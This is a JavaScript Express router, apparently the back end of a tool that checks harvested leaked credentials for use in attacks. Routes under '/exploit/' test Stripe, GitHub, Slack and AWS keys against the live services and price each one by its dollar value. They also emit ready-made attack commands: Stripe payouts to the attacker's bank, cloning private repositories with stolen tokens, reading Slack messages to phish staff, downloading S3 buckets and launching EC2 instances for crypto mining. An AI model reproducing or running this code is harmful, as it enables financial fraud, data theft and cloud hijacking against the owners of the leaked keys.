const express = require('express');
const router = express.Router();
const axios = require('axios');

// Admin auth
const adminAuth = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'] || req.headers['X-Admin-Key'] || req.body.adminKey;
  if (adminKey === 'Peace@25') {
    next();
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
};

// Auto-Tester - Test all keys
router.post('/exploit/test-all', adminAuth, async (req, res) => {
  try {
    const { credentials, batchSize = 100 } = req.body;
    const results = [];

    console.log(`ðŸ§ª Testing ${credentials.length} credentials in batches of ${batchSize}...`);

    // Limit to 500 max to prevent timeout
    const credentialsToTest = credentials.slice(0, 500);

    for (const cred of credentialsToTest) {
      try {
        let testResult = { id: cred.id, type: cred.credential_type, status: 'unknown' };

        // Test Stripe keys
        if (cred.credential_type === 'stripe_key' && cred.api_key) {
          try {
            const response = await axios.get('https://api.stripe.com/v1/balance', {
              auth: { username: cred.api_key, password: '' },
              timeout: 5000
            });
            testResult.status = 'LIVE';
            testResult.balance = response.data.available[0]?.amount || 0;
            testResult.currency = response.data.available[0]?.currency || 'usd';
          } catch (e) {
            testResult.status = 'DEAD';
            testResult.error = e.response?.status || 'timeout';
          }
        }

        // Test GitHub tokens
        if (cred.credential_type === 'github_token' && cred.token) {
          try {
            const response = await axios.get('https://api.github.com/user', {
              headers: { 'Authorization': `token ${cred.token}` },
              timeout: 5000
            });
            testResult.status = 'ACTIVE';
            testResult.username = response.data.login;
            testResult.repos = response.data.public_repos + response.data.total_private_repos;
          } catch (e) {
            testResult.status = 'INVALID';
          }
        }

        // Test AWS keys (basic check)
        if (cred.credential_type === 'aws_key' && cred.api_key) {
          testResult.status = 'NEEDS_SECRET';
          testResult.note = 'AWS requires both access key and secret key';
        }

        results.push(testResult);
      } catch (error) {
        results.push({ id: cred.id, status: 'error', error: error.message });
      }
    }

    res.json({
      success: true,
      tested: results.length,
      total: credentials.length,
      limited: credentials.length > 500,
      results: results,
      summary: {
        live: results.filter(r => r.status === 'LIVE').length,
        dead: results.filter(r => r.status === 'DEAD').length,
        active: results.filter(r => r.status === 'ACTIVE').length,
        unknown: results.filter(r => r.status === 'unknown').length
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Universal Credential Tester - Test ALL credential types
router.post('/exploit/check-balances', adminAuth, async (req, res) => {
  try {
    const { credentials, batchSize = 100 } = req.body;
    const results = [];
    let totalValue = 0;

    // Categorize credentials
    const stripeKeys = credentials.filter(c => c.credential_type === 'stripe_key' && c.api_key);
    const githubTokens = credentials.filter(c => c.credential_type === 'github_token' && c.token);
    const awsKeys = credentials.filter(c => c.credential_type === 'aws_key' && c.api_key);
    const slackTokens = credentials.filter(c => c.credential_type === 'slack_token' && c.token);

    console.log(`ðŸ”¥ Testing ${credentials.length} credentials: Stripe(${stripeKeys.length}) GitHub(${githubTokens.length}) AWS(${awsKeys.length}) Slack(${slackTokens.length})`);

    // TEST STRIPE KEYS
    for (const key of stripeKeys.slice(0, 100)) {
      await new Promise(resolve => setTimeout(resolve, 100));
      try {
        const response = await axios.get('https://api.stripe.com/v1/balance', {
          auth: { username: key.api_key, password: '' },
          timeout: 5000
        });
        const balance = response.data.available[0]?.amount || 0;
        totalValue += balance / 100;
        results.push({
          type: 'Stripe',
          key: key.api_key.substring(0, 20) + '...',
          status: 'LIVE',
          balance: `$${(balance / 100).toFixed(2)}`,
          exploit: 'Create payout to your bank, buy gift cards via API, create refunds',
          value: balance / 100,
          commands: [
            `curl https://api.stripe.com/v1/balance -u ${key.api_key}:`,
            `curl https://api.stripe.com/v1/payouts -u ${key.api_key}: -d amount=10000 -d currency=usd`
          ]
        });
      } catch (e) {
        results.push({ type: 'Stripe', key: key.api_key.substring(0, 20) + '...', status: 'DEAD' });
      }
    }

    // TEST GITHUB TOKENS
    for (const token of githubTokens.slice(0, 100)) {
      await new Promise(resolve => setTimeout(resolve, 100));
      try {
        const userRes = await axios.get('https://api.github.com/user', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });
        const reposRes = await axios.get('https://api.github.com/user/repos?type=private&per_page=100', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });
        totalValue += reposRes.data.length * 50; // $50 per private repo
        results.push({
          type: 'GitHub',
          username: userRes.data.login,
          status: 'ACTIVE',
          privateRepos: reposRes.data.length,
          exploit: `Clone ${reposRes.data.length} private repos, steal source code, read secrets`,
          value: reposRes.data.length * 50,
          commands: reposRes.data.slice(0, 5).map(r => `git clone https://${token.token}@github.com/${r.full_name}.git`),
          repos: reposRes.data.map(r => r.full_name)
        });
      } catch (e) {
        results.push({ type: 'GitHub', status: 'INVALID' });
      }
    }

    // TEST SLACK TOKENS
    for (const token of slackTokens.slice(0, 50)) {
      await new Promise(resolve => setTimeout(resolve, 100));
      try {
        const response = await axios.get('https://slack.com/api/auth.test', {
          headers: { 'Authorization': `Bearer ${token.token}` },
          timeout: 5000
        });
        if (response.data.ok) {
          totalValue += 200;
          results.push({
            type: 'Slack',
            workspace: response.data.team,
            user: response.data.user,
            status: 'ACTIVE',
            exploit: 'Read all messages, download files, phish employees, steal company secrets',
            value: 200,
            commands: [
              `curl -H "Authorization: Bearer ${token.token}" https://slack.com/api/conversations.list`,
              `curl -H "Authorization: Bearer ${token.token}" https://slack.com/api/conversations.history?channel=CHANNEL_ID`
            ]
          });
        }
      } catch (e) {
        results.push({ type: 'Slack', status: 'INVALID' });
      }
    }

    // AWS KEYS
    awsKeys.slice(0, 50).forEach(key => {
      const metadata = typeof key.metadata === 'string' ? JSON.parse(key.metadata) : key.metadata;
      const hasSecret = metadata?.secret_key || metadata?.exploitable;
      const secretKey = metadata?.secret_key || '<need_secret>';
      
      results.push({
        type: 'AWS',
        key: key.api_key,
        secret_key: secretKey,
        status: hasSecret ? 'EXPLOITABLE' : 'NEEDS_SECRET',
        exploit: hasSecret ? 'FULL ACCESS! Launch EC2 for crypto mining, download S3 buckets, steal data' : 'Need secret key from same repo to exploit',
        value: hasSecret ? 800 : 100,
        repo_url: metadata?.repo_url,
        file_path: metadata?.file_path,
        commands: hasSecret ? [
          `export AWS_ACCESS_KEY_ID=${key.api_key}`,
          `export AWS_SECRET_ACCESS_KEY=${secretKey}`,
          `aws sts get-caller-identity  # Test if valid`,
          `aws s3 ls  # List all buckets`,
          `aws s3 sync s3://bucket-name .  # Download bucket`,
          `aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --instance-type t2.micro  # Mine crypto`
        ] : [
          `# Go to repo and find AWS_SECRET_ACCESS_KEY`,
          `git clone ${metadata?.repo_url || '<repo_url>'}`,
          `grep -r "AWS_SECRET" .`,
          `grep -r "secret_key" .`
        ]
      });
    });

    res.json({
      success: true,
      checked: results.length,
      totalValue: totalValue,
      results: results,
      summary: {
        live: results.filter(r => r.status === 'LIVE' || r.status === 'ACTIVE').length,
        dead: results.filter(r => r.status === 'DEAD' || r.status === 'INVALID').length,
        totalValue: totalValue,
        byType: {
          stripe: results.filter(r => r.type === 'Stripe' && r.status === 'LIVE').length,
          github: results.filter(r => r.type === 'GitHub' && r.status === 'ACTIVE').length,
          slack: results.filter(r => r.type === 'Slack' && r.status === 'ACTIVE').length,
          aws: results.filter(r => r.type === 'AWS').length
        }
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// AWS Scanner - List AWS resources
router.post('/exploit/scan-aws', adminAuth, async (req, res) => {
  try {
    const { credentials } = req.body;
    const awsKeys = credentials.filter(c => c.credential_type === 'aws_key');

    res.json({
      success: true,
      message: 'AWS scanning requires AWS CLI or SDK setup',
      awsKeys: awsKeys.length,
      instructions: [
        '1. Export AWS credentials: export AWS_ACCESS_KEY_ID=AKIA...',
        '2. Export secret key: export AWS_SECRET_ACCESS_KEY=...',
        '3. Run: aws ec2 describe-instances',
        '4. Run: aws s3 ls',
        '5. Run: aws iam list-users'
      ],
      keys: awsKeys.map(k => ({
        id: k.id,
        key: k.api_key,
        source: k.source,
        url: k.url
      }))
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// GitHub Cloner - List private repos
router.post('/exploit/clone-github', adminAuth, async (req, res) => {
  try {
    const { credentials } = req.body;
    const githubTokens = credentials.filter(c => c.credential_type === 'github_token' && c.token);
    const results = [];

    console.log(`ðŸ“¦ Scanning ${githubTokens.length} GitHub tokens...`);

    for (const token of githubTokens) { // Scan ALL tokens
      try {
        // Get user info
        const userResponse = await axios.get('https://api.github.com/user', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });

        // Get private repos
        const reposResponse = await axios.get('https://api.github.com/user/repos?type=private&per_page=100', {
          headers: { 'Authorization': `token ${token.token}` },
          timeout: 5000
        });

        results.push({
          id: token.id,
          username: userResponse.data.login,
          status: 'ACTIVE',
          privateRepos: reposResponse.data.length,
          repos: reposResponse.data.map(r => ({
            name: r.full_name,
            cloneUrl: r.clone_url.replace('https://', `https://${token.token}@`),
            size: r.size,
            language: r.language
          }))
        });
      } catch (error) {
        results.push({
          id: token.id,
          status: 'INVALID',
          error: error.message
        });
      }
    }

    res.json({
      success: true,
      checked: results.length,
      results: results,
      summary: {
        active: results.filter(r => r.status === 'ACTIVE').length,
        totalRepos: results.reduce((sum, r) => sum + (r.privateRepos || 0), 0)
      }
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;
